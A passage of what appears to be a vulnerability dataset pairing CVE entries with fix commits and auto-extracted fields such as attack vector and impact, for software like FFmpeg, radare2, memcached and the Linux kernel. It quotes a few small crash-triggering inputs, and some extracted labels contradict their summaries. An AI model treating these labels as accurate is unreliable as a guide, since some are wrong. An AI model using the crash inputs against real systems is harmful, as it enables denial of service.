http:\/\/svn.aircrack-ng.org\/trunk@2418 28c6078b-6c39-48e3-add9-af49d547ecab","summary":"buddy-ng.c in Aircrack-ng before 1.2 Beta 3 allows remote attackers to cause a denial of service (segmentation fault) via a response with a crafted length parameter.","commit_message_1":"buddy-ng : fixed segmentation fault ( close # <number> on github )","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a response with a crafted length parameter","Impact":"cause a denial of service ( segmentation fault )","Root Cause":"caused by a missing check for data format at buddy-ng","Attack Type":"remote attacker"},{"commit_id":"9c2cd3c93c05d009a91d84eedbb85873b0cb505d","cve_id":"CVE-2014-4978","cwe_id":"CWE-59","commit_message":"Fixes insecure use of temporary file (CVE-2014-4978).","summary":"The rs_filter_graph function in librawstudio\/rs-filter.c in rawstudio might allow local users to truncate arbitrary files via a symlink attack on (1) \/tmp\/rs-filter-graph.png or (2) \/tmp\/rs-filter-graph.","commit_message_1":"fix insecure use of temporary file ( <cve_id> )","Vulnerability Type":"Link Following","Attack Vector":"via a symlink attack on ( 1 ) \/ tmp \/ rs - filter - graph . png or ( 2 ) \/ tmp \/ rs - filter - graph .","Impact":"truncate arbitrary files","Root Cause":"by creating a symbolic link from a temporary file to various files on the system","Attack Type":"local attacker"},{"commit_id":"58c893e834ff20495d00770922","cve_id":"CVE-2012-6697","cwe_id":"CWE-399","commit_message":"Fixed infinite loop cauesd by invalid dns packets","summary":"InspIRCd before 2.0.7 allows remote attackers to cause a denial of service (infinite loop).","commit_message_1":"fixed infinite loop cauesd by invalid dns packet","Vulnerability Type":"Resource Management Errors","Attack Vector":"By sending a specially crafted packet","Impact":"cause a denial of service ( infinite loop ) ","Root Cause":"caused by the improper handling of an unsigned variable within dns.cpp","Attack Type":"remote attacker"},{"commit_id":"ed28c1ba666b39581adb860bf51cdde43c84cc89","cve_id":"CVE-2012-6696","cwe_id":"CWE-20","commit_message":"Fixed out of bounds memory access from malformed DNS queries that have an invalid length label. Introduced in a6a07de0daa353bcd29056a4535a9c4784c113c8.","summary":"inspircd in Debian before 2.0.7 does not properly handle unsigned integers.  NOTE: This vulnerability exists because of an incomplete fix to CVE-2012-1836.","commit_message_1":"fixed out of bound memory access from malformed dns query that have an invalid length label","Vulnerability Type":"Improper Input Validation","Attack Vector":"By sending specially crafted packets","Impact":"cause a denial of service","Root Cause":"does not properly handle unsigned integers ","Attack Type":"remote attacker"},{"commit_id":"7fe2e3df308b8b6a901cb2cfd60f398df53219de","cve_id":"CVE-2011-3177","cwe_id":"CWE-200","commit_message":"- ini-agent: added Write(.section_private.SECTION, BOOLEAN) (bnc#713661, CVE-2011-3177)\n- system agent: added  Write(.target.string, [filename, mode],  content)\n\nsvn merge -r66758:66764 http:\/\/svn.opensuse.org\/svn\/yast\/branches\/SuSE-Code-11-SP2-Branch\/core\n\nsvn path=\/trunk\/core\/; revision=67117","summary":"The YaST2 network created files with world readable permissions which could have allowed local users to read sensitive material out of network configuration files, like passwords for wireless networks.","commit_message_1":"added write (","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"none","Impact":"read sensitive material out of network configuration files , like passwords for wireless networks","Root Cause":"created files with world readable permissions which could","Attack Type":"local attacker"},{"commit_id":"fc0a80798576f80ca10b3f6c9c7097f12fd1d64e","cve_id":"CVE-2010-5329","cwe_id":"CWE-399","commit_message":"[media] v4l: Share code between video_usercopy and video_ioctl2\n\nThe two functions are mostly identical. They handle the copy_from_user\nand copy_to_user operations related with V4L2 ioctls and call the real\nioctl handler.\n\nCreate a __video_usercopy function that implements the core of\nvideo_usercopy and video_ioctl2, and call that function from both.\n\nSigned-off-by: Laurent Pinchart <laurent.pinchart@ideasonboard.com>\nAcked-by: Hans Verkuil <hverkuil@xs4all.nl>\nSigned-off-by: Mauro Carvalho Chehab <mchehab@redhat.com>","summary":"The video_usercopy function in drivers\/media\/video\/v4l2-ioctl.c in the Linux kernel before 2.6.39 relies on the count value of a v4l2_ext_controls data structure to determine a kmalloc size, which might allow local users to cause a denial of service (memory consumption) via a large value.","commit_message_1":"share code between video_usercopy and video_ioctl2 the two function are mostly identical","Vulnerability Type":"Resource Management Errors","Attack Vector":"via a large value","Impact":"cause a denial of service ( memory consumption )","Root Cause":"caused by a flaw","Attack Type":"local attacker"},{"commit_id":"0b29669c065f60501e7289e1950fa2a618962358","cve_id":"CVE-2007-6761","cwe_id":"CWE-119","commit_message":"V4L\/DVB (6751): V4L: Memory leak!  Fix count in videobuf-vmalloc mmap\n\nThis is pretty serious bug.  map->count is never initialized after the\ncall to kmalloc making the count start at some random trash value.  The\nend result is leaking videobufs.\n\nAlso, fix up the debug statements to print unsigned values.\n\nPushed to http:\/\/ifup.org\/hg\/v4l-dvb too\n\nSigned-off-by: Brandon Philips <bphilips@suse.de>\nSigned-off-by: Mauro Carvalho Chehab <mchehab@infradead.org>","summary":"drivers\/media\/video\/videobuf-vmalloc.c in the Linux kernel before 2.6.24 does not initialize videobuf_mapping data structures, which allows local users to trigger an incorrect count value and videobuf leak via unspecified vectors, a different vulnerability than CVE-2010-5321.","commit_message_1":"v4l : memory leak ! fix count in videobuf-vmalloc mmap this is pretty serious bug","Vulnerability Type":"buffer overflow","Attack Vector":"via unspecified vectors , a different vulnerability than cve - 2010 - 5321","Impact":"trigger an incorrect count value and videobuf leak","Root Cause":"does not initialize videobuf _ mapping data structures","Attack Type":"local attacker"},{"commit_id":"6c4841c2b6c32a134f9f36e5e08857138cc12b10","cve_id":"CVE-2006-5331","cwe_id":"CWE-19","commit_message":"[POWERPC] Never panic when taking altivec exceptions from userspace\n\nAt the moment we rely on a cpu feature bit or a firmware property to\ndetect altivec. If we dont have either of these and the cpu does in fact\nsupport altivec we can cause a panic from userspace.\n\nIt seems safer to always send a signal if we manage to get an 0xf20\nexception from userspace.\n\nSigned-off-by: Anton Blanchard <anton@samba.org>\nSigned-off-by: Paul Mackerras <paulus@samba.org>","summary":"The altivec_unavailable_exception function in arch\/powerpc\/kernel\/traps.c in the Linux kernel before 2.6.19 on 64-bit systems mishandles the case where CONFIG_ALTIVEC is defined and the CPU actually supports Altivec, but the Altivec support was not detected by the kernel, which allows local users to cause a denial of service (panic) by triggering execution of an Altivec instruction.","commit_message_1":"never panic when taking altivec exception from userspace at the moment we rely on a cpu feature bit or a firmware property to detect altivec","Vulnerability Type":"Data Processing Errors","Attack Vector":"by triggering execution of an altivec instruction","Impact":"cause a denial of service","Root Cause":"caused by the mishandling of the case where CONFIG_ALTIVEC is defined and the CPU actually supports Altivec by the altivec_unavailable_exception function","Attack Type":"local attacker"},{"commit_id":"4dcc29e1574d88f4465ba865ed82800032f76418","cve_id":"CVE-2006-3635","cwe_id":"CWE-119","commit_message":"[IA64] Workaround for RSE issue\n\nProblem: An application violating the architectural rules regarding\noperation dependencies and having specific Register Stack Engine (RSE)\nstate at the time of the violation, may result in an illegal operation\nfault and invalid RSE state.  Such faults may initiate a cascade of\nrepeated illegal operation faults within OS interruption handlers.\nThe specific behavior is OS dependent.\n\nImplication: An application causing an illegal operation fault with\nspecific RSE state may result in a series of illegal operation faults\nand an eventual OS stack overflow condition.\n\nWorkaround: OS interruption handlers that switch to kernel backing\nstore implement a check for invalid RSE state to avoid the series\nof illegal operation faults.\n\nThe core of the workaround is the RSE_WORKAROUND code sequence\ninserted into each invocation of the SAVE_MIN_WITH_COVER and\nSAVE_MIN_WITH_COVER_R19 macros.  This sequence includes hard-coded\nconstants that depend on the number of stacked physical registers\nbeing 96.  The rest of this patch consists of code to disable this\nworkaround should this not be the case (with the presumption that\nif a future Itanium processor increases the number of registers, it\nwould also remove the need for this patch).\n\nMove the start of the RBS up to a mod32 boundary to avoid some\ncorner cases.\n\nThe dispatch_illegal_op_fault code outgrew the spot it was\nsquatting in when built with this patch and CONFIG_VIRT_CPU_ACCOUNTING=y\nMove it out to the end of the ivt.\n\nSigned-off-by: Tony Luck <tony.luck@intel.com>","summary":"The ia64 subsystem in the Linux kernel before 2.6.26 allows local users to cause a denial of service (stack consumption and system crash) via a crafted application that leverages the mishandling of invalid Register Stack Engine (RSE) state.","commit_message_1":"workaround for rse issue problem : an application violating the architectural rule regarding operation dependency and having specific register stack engine ( rse ) state at the time of the violation , may result in an illegal operation fault and invalid rse state","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted application that leverages the mishandling of invalid register stack engine ( rse ) state","Impact":"cause a denial of service ( stack consumption and system crash )","Root Cause":"caused by a flaw","Attack Type":"local attacker"},{"commit_id":"5aba5b89d0b1d73164d3b81764828bb8b20ff32a","cve_id":"CVE-2018-1999015","cwe_id":"CWE-125","commit_message":"avcodec\/mpeg4videodec: Check for bitstream end in read_quant_matrix_ext()\n\nFixes: out of array read\nFixes: asff-crash-0e53d0dc491dfdd507530b66562812fbd4c36678\n\nFound-by: Paul Ch <paulcher@icloud.com>\nSigned-off-by: Michael Niedermayer <michael@niedermayer.cc>","summary":"FFmpeg before commit 5aba5b89d0b1d73164d3b81764828bb8b20ff32a contains an out of array read vulnerability in ASF_F format demuxer that can result in heap memory reading. This attack appear to be exploitable via specially crafted ASF file that has to provided as input. This vulnerability appears to have been fixed in 5aba5b89d0b1d73164d3b81764828bb8b20ff32a and later.","commit_message_1":"avcodec\/mpeg4videodec : check for bitstream end in read_quant_matrix_ext ( )","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service","Root Cause":"caused by an out-of-array read","Attack Type":"remote attacker"},{"commit_id":"bab0716c7f4793ec42e05a5aa7e80d82a0dd4e75","cve_id":"CVE-2018-1999014","cwe_id":"CWE-125","commit_message":"avformat\/mxfdec: Fix av_log context\n\nFixes: out of array access\nFixes: mxf-crash-1c2e59bf07a34675bfb3ada5e1ec22fa9f38f923\n\nFound-by: Paul Ch <paulcher@icloud.com>\nSigned-off-by: Michael Niedermayer <michael@niedermayer.cc>","summary":"FFmpeg before commit bab0716c7f4793ec42e05a5aa7e80d82a0dd4e75 contains an out of array access vulnerability in MXF format demuxer that can result in DoS. This attack appear to be exploitable via specially crafted MXF file which has to be provided as input. This vulnerability appears to have been fixed in bab0716c7f4793ec42e05a5aa7e80d82a0dd4e75 and later.","commit_message_1":"avformat\/mxfdec : fix av_log context","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service","Root Cause":"caused by an out-of-array access","Attack Type":"remote attacker"},{"commit_id":"a7e032a277452366771951e29fd0bf2bd5c029f0","cve_id":"CVE-2018-1999013","cwe_id":"CWE-416","commit_message":"avformat\/rmdec: Do not pass mime type in rm_read_multi() to ff_rm_read_mdpr_codecdata()\n\nFixes: use after free()\nFixes: rmdec-crash-ffe85b4cab1597d1cfea6955705e53f1f5c8a362\n\nFound-by: Paul Ch <paulcher@icloud.com>\nSigned-off-by: Michael Niedermayer <michael@niedermayer.cc>","summary":"FFmpeg before commit a7e032a277452366771951e29fd0bf2bd5c029f0 contains a use-after-free vulnerability in the realmedia demuxer that can result in vulnerability allows attacker to read heap memory. This attack appear to be exploitable via specially crafted RM file has to be provided as input. This vulnerability appears to have been fixed in a7e032a277452366771951e29fd0bf2bd5c029f0 and later.","commit_message_1":"do not pas mime type in rm_read_multi ( ) to ff_rm_read_mdpr_codecdata ( )","Vulnerability Type":"Use After Free","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"obtain sensitive information","Root Cause":"caused by a use-after-free","Attack Type":"remote attacker"},{"commit_id":"9807d3976be0e92e4ece3b4b1701be894cd7c2e1","cve_id":"CVE-2018-1999012","cwe_id":"CWE-835","commit_message":"avformat\/pva: Check for EOF before retrying in read_part_of_packet()\n\nFixes: Infinite loop\nFixes: pva-4b1835dbc2027bf3c567005dcc78e85199240d06\n\nFound-by: Paul Ch <paulcher@icloud.com>\nSigned-off-by: Michael Niedermayer <michael@niedermayer.cc>","summary":"FFmpeg before commit 9807d3976be0e92e4ece3b4b1701be894cd7c2e1 contains a CWE-835: Infinite loop vulnerability in pva format demuxer that can result in a Vulnerability that allows attackers to consume excessive amount of resources like CPU and RAM. This attack appear to be exploitable via specially crafted PVA file has to be provided as input. This vulnerability appears to have been fixed in 9807d3976be0e92e4ece3b4b1701be894cd7c2e1 and later.","commit_message_1":"avformat\/pva : check for eof before retrying in read_part_of_packet ( )","Vulnerability Type":"Infinite Loop","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service","Root Cause":"caused by an infinite loop","Attack Type":"remote attacker"},{"commit_id":"2b46ebdbff1d8dec7a3d8ea280a612b91a582869","cve_id":"CVE-2018-1999011","cwe_id":"CWE-119","commit_message":"avformat\/asfdec_o: Check size_bmp more fully\n\nFixes: integer overflow and out of array access\nFixes: asfo-crash-46080c4341572a7137a162331af77f6ded45cbd7\n\nFound-by: Paul Ch <paulcher@icloud.com>\nSigned-off-by: Michael Niedermayer <michael@niedermayer.cc>","summary":"FFmpeg before commit 2b46ebdbff1d8dec7a3d8ea280a612b91a582869 contains a Buffer Overflow vulnerability in asf_o format demuxer that can result in heap-buffer-overflow that may result in remote code execution. This attack appears to be exploitable via specially crafted ASF file that has to be provided as input to FFmpeg. This vulnerability appears to have been fixed in 2b46ebdbff1d8dec7a3d8ea280a612b91a582869 and later.","commit_message_1":"avformat\/asfdec_o : check size_bmp more fully","Vulnerability Type":"buffer overflow","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"overflow a buffer and execute arbitrary code","Root Cause":"caused by improper bounds checking by the asf_o format demuxer","Attack Type":"remote attacker"},{"commit_id":"cced03dd667a5df6df8fd40d8de0bff477ee02e8","cve_id":"CVE-2018-1999010","cwe_id":"CWE-125","commit_message":"avformat\/mms: Add missing chunksize check\n\nFixes: out of array read\nFixes: mms-crash-01b6c5d85f9d9f40f4e879896103e9f5b222816a\n\nFound-by: Paul Ch <paulcher@icloud.com>\n1st hunk by Paul Ch <paulcher@icloud.com>\nTested-by: Paul Ch <paulcher@icloud.com>\nSigned-off-by: Michael Niedermayer <michael@niedermayer.cc>","summary":"FFmpeg before commit cced03dd667a5df6df8fd40d8de0bff477ee02e8 contains multiple out of array access vulnerabilities in the mms protocol that can result in attackers accessing out of bound data. This attack appear to be exploitable via network connectivity. This vulnerability appears to have been fixed in cced03dd667a5df6df8fd40d8de0bff477ee02e8 and later.","commit_message_1":"add missing chunksize check 1st hunk by paul ch < paulcher @ <file> >","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service","Root Cause":"caused by an out-of-array access","Attack Type":"remote attacker"},{"commit_id":"5d2fc16a1976e5bf78d2927b012f67a2ae047a98","cve_id":"CVE-2018-1002209","cwe_id":"CWE-22","commit_message":"Fixed the Zip Slip vulnerability in JlCompress\n\nWhen extracting a file with a dangerous path like \"..\/evil.exe\"\nfrom a ZIP archive with JlCompress::extractDir(), the target\nfile would be created outside of the target directory, potentially\neven overwriting an existing file there.","summary":"QuaZIP before 0.7.6 is vulnerable to directory traversal, allowing attackers to write to arbitrary files via a ..\/ (dot dot slash) in a Zip archive entry that is mishandled during extraction. This vulnerability is also known as 'Zip-Slip'.","commit_message_1":"fixed the zip slip vulnerability in jlcompress when extracting a file with a dangerous path like ``","Vulnerability Type":"Path Traversal","Attack Vector":"via a . . \/ ( dot dot slash ) in a zip archive entry that is mishandled during extraction .","Impact":"write to arbitrary files","Root Cause":"extract a specially-crafted ZIP archive containing \"dot dot slash\" sequences (..\/)","Attack Type":"remote attacker"},{"commit_id":"c18663aa171c6cdf03da3e8c70df8663645b97c4","cve_id":"CVE-2018-1000815","cwe_id":null,"commit_message":"Issue: 15232 AllowScript should use atom::ContentSettingsManager like other Allow* methods in the observer","summary":"Brave Software Inc. Brave version version 0.22.810 to 0.24.0 contains a Other\/Unknown vulnerability in function ContentSettingsObserver::AllowScript() in content_settings_observer.cc that can result in Websites can run inline JavaScript even if script is blocked, making attackers easier to track users. This attack appear to be exploitable via the victim must visit a specially crafted website. This vulnerability appears to have been fixed in 0.25.2.","commit_message_1":"<number> allowscript should use atom : :contentsettingsmanager like other allow * method in the observer","Vulnerability Type":"cross-site scripting","Attack Vector":"the URL is clicked","Impact":"steal the victim's cookie-based authentication credentials","Root Cause":"caused by improper validation of user-supplied input by the ContentSettingsObserver::AllowScript function","Attack Type":"remote attacker"},{"commit_id":"252c1ca184cb38e1acb917aa0e451c5f08519996","cve_id":"CVE-2018-1000524","cwe_id":"CWE-190","commit_message":"Fix integer overflow in layer_resize in map_engine.c (#268)\n\n* Fix integer overflow in layer_resize in map_engine.c\n\nThere's a buffer overflow bug in the function layer_resize. It allocates\na buffer `tilemap` with size `x_size * y_size * sizeof(struct map_tile)`.\nBut it didn't check for integer overflow, so if x_size and y_size are\nvery large, it's possible that the buffer size is smaller than needed,\ncausing a buffer overflow later.\n\nPoC: `SetLayerSize(0, 0x7FFFFFFF, 0x7FFFFFFF);`\n\n* move malloc to a separate line","summary":"miniSphere version 5.2.9 and earlier contains a Integer Overflow vulnerability in layer_resize() function in map_engine.c that can result in remote denial of service. This attack appear to be exploitable via the victim must load a specially-crafted map which calls SetLayerSize in its entry script. This vulnerability appears to have been fixed in 5.0.3, 5.1.5, 5.2.10 and later.","commit_message_1":"fix integer overflow in layer_resize in <file> ( # <number> ) * fix integer overflow in layer_resize in <file> there 's a buffer overflow bug in the function layer_resize","Vulnerability Type":"integer overflow","Attack Vector":"By persuading a victim to load a specially-crafted map","Impact":"cause a denial of service","Root Cause":"caused by an integer overflow","Attack Type":"remote attacker"},{"commit_id":"a45b599ad808c3c982fdcdc12b0b8611c2f92824","cve_id":"CVE-2018-1000204","cwe_id":null,"commit_message":"scsi: sg: allocate with __GFP_ZERO in sg_build_indirect()\n\nThis shall help avoid copying uninitialized memory to the userspace when\ncalling ioctl(fd, SG_IO) with an empty command.\n\nReported-by: syzbot+7d26fc1eea198488deab@syzkaller.appspotmail.com\nCc: stable@vger.kernel.org\nSigned-off-by: Alexander Potapenko <glider@google.com>\nAcked-by: Douglas Gilbert <dgilbert@interlog.com>\nReviewed-by: Johannes Thumshirn <jthumshirn@suse.de>\nSigned-off-by: Martin K. Petersen <martin.petersen@oracle.com>","summary":"** DISPUTED ** Linux Kernel version 3.18 to 4.16 incorrectly handles an SG_IO ioctl on \/dev\/sg0 with dxfer_direction=SG_DXFER_FROM_DEV and an empty 6-byte cmdp. This may lead to copying up to 1000 kernel heap pages to the userspace. This has been fixed upstream in https:\/\/github.com\/torvalds\/linux\/commit\/a45b599ad808c3c982fdcdc12b0b8611c2f92824 already. The problem has limited scope, as users don't usually have permissions to access SCSI devices. On the other hand, e.g. the Nero user manual suggests doing `chmod o+r+w \/dev\/sg*` to make the devices accessible. NOTE: third parties dispute the relevance of this report, noting that the requirement for an attacker to have both the CAP_SYS_ADMIN and CAP_SYS_RAWIO capabilities makes it *virtually impossible to exploit.*","commit_message_1":"sg : allocate with __gfp_zero in sg_build_indirect ( ) this shall help avoid copying uninitialized memory to the userspace when calling ioctl ( fd , sg_io ) with an empty command","Vulnerability Type":"unspecified","Attack Vector":"By sending a specially-crafted argument","Impact":"obtain sensitive information","Root Cause":"caused by the improper handling of an SG_IO ioctl on \/dev\/sg0","Attack Type":"remote attacker"},{"commit_id":"a8c4a82787b8b6c256d61bd5c42fb7f92d1bae00","cve_id":"CVE-2018-1000127","cwe_id":"CWE-190","commit_message":"Don't overflow item refcount on get\n\nCounts as a miss if the refcount is too high. ASCII multigets are the only\ntime refcounts can be held for so long.\n\ndoing a dirty read of refcount. is aligned.\n\ntrying to avoid adding an extra refcount branch for all calls of item_get due\nto performance. might be able to move it in there after logging refactoring\nsimplifies some of the branches.","summary":"memcached version prior to 1.4.37 contains an Integer Overflow vulnerability in items.c:item_free() that can result in data corruption and deadlocks due to items existing in hash table being reused from free list. This attack appear to be exploitable via network connectivity to the memcached service. This vulnerability appears to have been fixed in 1.4.37 and later.","commit_message_1":"do n't overflow item refcount on get count a a miss if the refcount is too high","Vulnerability Type":"integer overflow","Attack Vector":"By sending a specially-crafted request","Impact":"cause a denial of service","Root Cause":"caused by an integer overflow","Attack Type":"remote attacker"},{"commit_id":"ce361a12e355f9e1e99c989f1ea056c9e502dbe7","cve_id":"CVE-2018-1000118","cwe_id":"CWE-78","commit_message":"Use case-insensitive switch comparisons","summary":"Github Electron version Electron 1.8.2-beta.4 and earlier contains a Command Injection vulnerability in Protocol Handler that can result in command execute. This attack appear to be exploitable via the victim opening an electron protocol handler in their browser. This vulnerability appears to have been fixed in Electron 1.8.2-beta.5. This issue is due to an incomplete fix for CVE-2018-1000006, specifically the black list used was not case insensitive allowing an attacker to potentially bypass it.","commit_message_1":"use case-insensitive switch comparison","Vulnerability Type":"command injection","Attack Vector":"By persuading a victim to open a specially-crafted electron protocol handler in their browser","Impact":"execute arbitrary commands","Root Cause":"caused by a flaw","Attack Type":"remote attacker"},{"commit_id":"dbb7a8af90054bf4ef51f5814ef7ceb17d83d974","cve_id":"CVE-2018-1000115","cwe_id":"CWE-20","commit_message":"disable UDP port by default\n\nAs reported, UDP amplification attacks have started to use insecure\ninternet-exposed memcached instances. UDP used to be a lot more popular as a\ntransport for memcached many years ago, but I'm not aware of many recent\nusers.\n\nTen years ago, the TCP connection overhead from many clients was relatively\nhigh (dozens or hundreds per client server), but these days many clients are\nbatched, or user fewer processes, or simply anre't worried about it.\n\nWhile changing the default to listen on localhost only would also help, the\ntrue culprit is UDP. There are many more use cases for using memcached over\nthe network than there are for using the UDP protocol.","summary":"Memcached version 1.5.5 contains an Insufficient Control of Network Message Volume (Network Amplification, CWE-406) vulnerability in the UDP support of the memcached server that can result in denial of service via network flood (traffic amplification of 1:50,000 has been reported by reliable sources). This attack appear to be exploitable via network connectivity to port 11211 UDP. This vulnerability appears to have been fixed in 1.5.6 due to the disabling of the UDP protocol by default.","commit_message_1":"disable udp port by default a reported , udp amplification attack have started to use insecure internet-exposed memcached instance","Vulnerability Type":"Improper Input Validation","Attack Vector":"By flooding the network with requests using spoofed UDP packets to port 11211 UDP","Impact":"cause a denial of service","Root Cause":"caused by an amplification attack","Attack Type":"remote attacker"},{"commit_id":"d96a6b8bcc7439fa7e3876207aa0a8e79c8451b6","cve_id":"CVE-2018-1000085","cwe_id":"CWE-125","commit_message":"bb11588 - fix out of bounds read.","summary":"ClamAV version version 0.99.3 contains a Out of bounds heap memory read vulnerability in XAR parser, function xar_hash_check() that can result in Leaking of memory, may help in developing exploit chains.. This attack appear to be exploitable via The victim must scan a crafted XAR file. This vulnerability appears to have been fixed in after commit d96a6b8bcc7439fa7e3876207aa0a8e79c8451b6.","commit_message_1":"bb11588 - fix out of bound read","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service","Root Cause":"caused by an out-of-bounds heap memory read flaw","Attack Type":"remote attacker"},{"commit_id":"244d83bc3d859293f55812d48b3db168e581f6ab","cve_id":"CVE-2018-1000050","cwe_id":"CWE-119","commit_message":"fix unchecked length in stb_vorbis that could crash on corrupt\/invalid files","summary":"Sean Barrett stb_vorbis version 1.12 and earlier contains a Buffer Overflow vulnerability in All vorbis decoding paths. that can result in memory corruption, denial of service, comprised execution of host program. This attack appear to be exploitable via Victim must open a specially crafted Ogg Vorbis file. This vulnerability appears to have been fixed in 1.13.","commit_message_1":"fix unchecked length in stb_vorbis that could crash on corrupt\/invalid file","Vulnerability Type":"buffer overflow","Attack Vector":"By persuading a victim to open a specially crafted file","Impact":"overflow a buffer and execute arbitrary code","Root Cause":"caused by improper bounds checking by all Vorbis decoding paths","Attack Type":"remote attacker"},{"commit_id":"151481489192e6d1997f8bde52c5c425ea41741d","cve_id":"CVE-2018-20542","cwe_id":"CWE-119","commit_message":"Issue #287: made CSR\/CSC readers more robust against invalid input (case #1).","summary":"There is a heap-based buffer-overflow at generator_spgemm_csc_reader.c (function libxsmm_sparse_csc_reader) in LIBXSMM 1.10, a different vulnerability than CVE-2018-20541 (which is in a different part of the source code and is seen at a different address).","commit_message_1":"made csr\/csc reader more robust against invalid input ( case # <number> )","Vulnerability Type":"buffer overflow","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"overflow a buffer and execute arbitrary code","Root Cause":"caused by improper bounds checking by the generator_spgemm_csc_reader.c (function libxsmm_sparse_csc_reader)","Attack Type":"remote attacker"},{"commit_id":"9824dfae5741275473a23a7ed5756c7b6efacc9d","cve_id":"CVE-2018-20511","cwe_id":"CWE-200","commit_message":"net\/appletalk: fix minor pointer leak to userspace in SIOCFINDIPDDPRT\n\nFields ->dev and ->next of struct ipddp_route may be copied to\nuserspace on the SIOCFINDIPDDPRT ioctl. This is only accessible\nto CAP_NET_ADMIN though. Let's manually copy the relevant fields\ninstead of using memcpy().\n\nBugLink: http:\/\/blog.infosectcbr.com.au\/2018\/09\/linux-kernel-infoleaks.html\nCc: Jann Horn <jannh@google.com>\nSigned-off-by: Willy Tarreau <w@1wt.eu>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"An issue was discovered in the Linux kernel before 4.18.11. The ipddp_ioctl function in drivers\/net\/appletalk\/ipddp.c allows local users to obtain sensitive kernel address information by leveraging CAP_NET_ADMIN to read the ipddp_route dev and next fields via an SIOCFINDIPDDPRT ioctl call.","commit_message_1":"fix minor pointer leak to userspace in siocfindipddprt field - > dev and - > next of struct ipddp_route may be copied to userspace on the siocfindipddprt ioctl","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via an siocfindipddprt ioctl call","Impact":"obtain sensitive kernel address information by leveraging cap _ net _ admin to read the ipddp _ route dev and next fields","Root Cause":"caused by a flaw","Attack Type":"local attacker"},{"commit_id":"db0add932fb850d762b02604ca3053b7d7ab6deb","cve_id":"CVE-2018-20467","cwe_id":"CWE-835","commit_message":"Prevent infinite loop","summary":"In coders\/bmp.c in ImageMagick before 7.0.8-16, an input file can result in an infinite loop and hang, with high CPU and memory consumption. Remote attackers could leverage this vulnerability to cause a denial of service via a crafted file.","commit_message_1":"prevent infinite loop","Vulnerability Type":"Infinite Loop","Attack Vector":"via a crafted file","Impact":"cause a denial of service","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"a1bc65c3db593530775823d6d7506a457ed95267","cve_id":"CVE-2018-20461","cwe_id":"CWE-125","commit_message":"Fix #12375 - Crash in bd+ao (#12382)","summary":"In radare2 prior to 3.1.1, core_anal_bytes in libr\/core\/cmd_anal.c allows attackers to cause a denial-of-service (application crash caused by out-of-bounds read) by crafting a binary file.","commit_message_1":"fix # <number> - crash in bd+ao ( # <number> )","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"by crafting a binary file","Impact":"cause a denial - of - service ( application crash caused by out - of - bounds read )","Root Cause":"caused by an out-of-bounds read flaw","Attack Type":"remote attacker"},{"commit_id":"df167c7db545953bb7f71c72e98e7a3ca0c793bf","cve_id":"CVE-2018-20460","cwe_id":"CWE-119","commit_message":"Fix #12376 - crash in: rasm2 -a arm -b 64 '0 ,0,0,0,0,0,0,'","summary":"In radare2 prior to 3.1.2, the parseOperands function in libr\/asm\/arch\/arm\/armass64.c allows attackers to cause a denial-of-service (application crash caused by stack-based buffer overflow) by crafting an input file.","commit_message_1":"rasm2 -a arm -b <number> '<number> , <number> , <number> , <number> , <number> , <number> , <number> , '","Vulnerability Type":"buffer overflow","Attack Vector":"by crafting an input file ","Impact":"cause a denial - of - service ( application crash caused by stack - based buffer overflow )","Root Cause":"caused by a stack-based buffer overflow","Attack Type":"remote attacker"},{"commit_id":"88a8adf080a9f8ed5a4250a2507752e133ba54dd","cve_id":"CVE-2018-20459","cwe_id":"CWE-125","commit_message":"Fix #12417\/#12418 attempts.","summary":"In radare2 through 3.1.3, the armass_assemble function in libr\/asm\/arch\/arm\/armass.c allows attackers to cause a denial-of-service (application crash by out-of-bounds read) by crafting an arm assembly input because a loop uses an incorrect index in armass.c and certain length validation is missing in armass64.c, a related issue to CVE-2018-20457.","commit_message_1":"fix # <number>\/ # <number> attempt","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"by crafting an arm assembly input because a loop uses an incorrect index in armass . c and certain length validation is missing in armass64 . c , a related issue to cve - 2018 - 20457","Impact":"cause a denial - of - service ( application crash by out - of - bounds read )","Root Cause":"caused by an out-of-bounds read flaw","Attack Type":"remote attacker"},{"commit_id":"4e98402f09a0ef0bb8559a33a4c1988c54938eaf","cve_id":"CVE-2018-20458","cwe_id":"CWE-125","commit_message":"Fix #12374 - oobread crash in truncated dyldcache ##bin","summary":"In radare2 prior to 3.1.1, r_bin_dyldcache_extract in libr\/bin\/format\/mach0\/dyldcache.c may allow attackers to cause a denial-of-service (application crash caused by out-of-bounds read) by crafting an input file.","commit_message_1":"fix # <number> - oobread crash in truncated dyldcache # # bin","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"by crafting an input file","Impact":"cause a denial - of - service ( application crash caused by out - of - bounds read )","Root Cause":"caused by an out-of-bounds read flaw","Attack Type":"remote attacker"},{"commit_id":"9b46d38dd3c4de6048a488b655c7319f845af185","cve_id":"CVE-2018-20456","cwe_id":"CWE-125","commit_message":"Fix #12372 and #12373 - Crash in x86 assembler (#12380)\n\n0 ,0,[bP-bL-bP-bL-bL-r-bL-bP-bL-bL-\nmov ,0,[ax+Bx-ax+Bx-ax+ax+Bx-ax+Bx--\nleA ,0,[bP-bL-bL-bP-bL-bP-bL-60@bL-\nleA ,0,[bP-bL-r-bP-bL-bP-bL-60@bL-\nmov ,0,[ax+Bx-ax+Bx-ax+ax+Bx-ax+Bx--","summary":"In radare2 prior to 3.1.1, the parseOperand function inside libr\/asm\/p\/asm_x86_nz.c may allow attackers to cause a denial of service (application crash in libr\/util\/strbuf.c 